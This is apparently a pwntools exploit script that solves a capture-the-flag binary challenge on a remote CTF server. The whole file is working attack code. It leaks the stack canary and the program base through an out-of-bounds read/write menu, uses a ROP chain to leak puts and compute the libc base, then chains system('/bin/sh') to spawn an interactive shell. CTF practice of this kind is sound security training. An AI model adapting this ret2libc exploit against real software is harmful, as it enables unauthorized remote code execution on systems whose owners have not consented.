from pwn import *
from math import ceil

REMOTE = 1
DEBUG = 0
proc_name = "./exploitClass"
context.terminal = "tmux splitw -h -f".split()
elf = ELF(proc_name, checksec=False)
gdb_cmd = """
# insert gdb command here
"""
if REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
    p = remote("class.uni.hctf.fun", 24241)
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    p = process(proc_name)

if DEBUG and not REMOTE:
    gdb.attach(p, gdb_cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"])

elf.symbols['pop_rdi'] = 0x14a3
def read(idx):
    p.sendlineafter('!\n', str(1))
    p.sendlineafter('?\n', str(idx))
    data = p.recvuntil("\nEnter", drop=True)
    return data

def write(idx, content):
    p.sendlineafter('!\n', str(2))
    p.sendlineafter('?\n', str(idx))
    p.sendlineafter('?\n', str(content))
    return

write(21, "A"*11)
write(22, "")
canary = u64("\x00" + read(21).split("\n\n")[1])
print(hex(canary))
#write(22, p64(canary))
write(22, "A"*12)
write(23, "A"*3)
leak = u64(read(21).split("\n")[-1].ljust(8, "\x00"))
base_text = leak - 0x1440
elf.address = base_text
print(hex(base_text))
write(22, p64(canary))

sidx = 24
pop_rdi = elf.symbols['pop_rdi']

rop  = "A"*8 # padding
rop += p64(pop_rdi)
rop += p64(elf.got['puts'])
rop += p64(elf.symbols['puts'])
rop += p64(elf.symbols['main'])
for i in range(int(len(rop) / 12) + 1):
    write(sidx+i, rop[i*12:(i+1)*12])
sidx = 24
p.sendlineafter("!\n", "3")
p.recvuntil("session!\n")
leak = u64(p.recvuntil("\n", drop=True).ljust(8, "\x00"))
print(hex(leak))
libc.address = leak - libc.symbols['puts']
print(hex(libc.address))

system = libc.symbols['system']
print(hex(system))
binsh = libc.search("/bin/sh").next()
print(hex(binsh))
rop  = "A"*8
rop += p64(pop_rdi)
rop += p64(binsh)
rop += p64(system)

write(22, p64(canary))
for i in range(int(len(rop) / 12) + 1):
    write(sidx+i, rop[i*12:(i+1)*12])
p.sendlineafter("!\n", "3")
p.interactive()
